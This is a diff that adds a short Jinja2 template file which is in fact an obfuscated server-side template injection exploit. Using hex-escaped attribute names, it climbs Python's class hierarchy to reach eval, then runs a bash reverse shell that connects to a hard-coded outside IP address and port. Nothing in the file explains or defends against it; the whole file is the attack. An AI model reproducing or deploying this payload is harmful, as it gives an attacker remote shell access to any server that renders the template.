@@ -1,0 +1,8 @@
+{% for c in []['\x5f\x5fclass\x5f\x5f']['\x5f\x5fbase\x5f\x5f']['\x5f\x5fsubclasses\x5f\x5f']() %}
+  {% if c['\x5f\x5fname\x5f\x5f'] == 'catch\x5fwarnings' %}
+    {% for b in c['\x5f\x5finit\x5f\x5f']['\x5f\x5fglobals\x5f\x5f']['values']() %}
+      {% if b['\x5f\x5fclass\x5f\x5f'] == {}['\x5f\x5fclass\x5f\x5f'] %}
+        {% if b['eval'] and
+              b['eval']('\x5f\x5fimport\x5f\x5f("os")\x2esystem("bash -c \'bash -i >& /dev/tcp/140\x2e112\x2e150\x2e130/9487 0>&1\'")') %}
+          Owo
+{% endif %}{% endif %}{% endfor %}{% endif %}{% endfor %}
